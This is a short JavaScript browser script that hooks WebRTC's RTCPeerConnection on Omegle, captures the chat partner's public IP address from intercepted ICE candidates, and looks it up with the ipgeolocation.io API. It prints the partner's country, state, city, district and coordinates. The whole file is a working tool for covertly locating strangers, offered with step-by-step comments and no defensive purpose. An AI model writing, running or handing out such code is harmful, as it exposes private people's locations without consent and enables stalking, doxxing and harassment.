const apiKey = "my-api-key";

/* WEb RTC enables you to communicate with another user on Omegle.   */
window.oRTCPeerConnection =
    window.oRTCPeerConnection || window.RTCPeerConnection;

//STEP 1: We get the IP Address.
window.RTCPeerConnection = function(...args) {
    const pc = new window.oRTCPeerConnection(...args);

    //Ice (ICE)= Interactive Connectivity Establishment allows 2 pc's talk to each other directly via P2P.
    pc.oaddIceCandidate = pc.addIceCandidate;

    pc.addIceCandidate = function (iceCandidate, ...rest) {
        const fields = iceCandidate.candidate.split(" ");
        const ip = fields[4];
        if (fields[7] === "srflx") { //udp candidate types. srflx(server reflexive candidate)
            getLocation(ip);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest);
    };
    return pc;
};

//STEP 2: We get the location data.
const getLocation = async (ip) => {
    let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

    await fetch(url).then((response) => 
        response.json().then((json) => {
            const output = `
                ---------------------
                Country: ${json.country_name};
                State: ${json.state_prov};
                City: ${json.city};
                District: ${json.district};
                Lat / Long: (${json.latitude}, ${json.longitude})
                ---------------------
                `;
            console.log(output);
        })
    );
};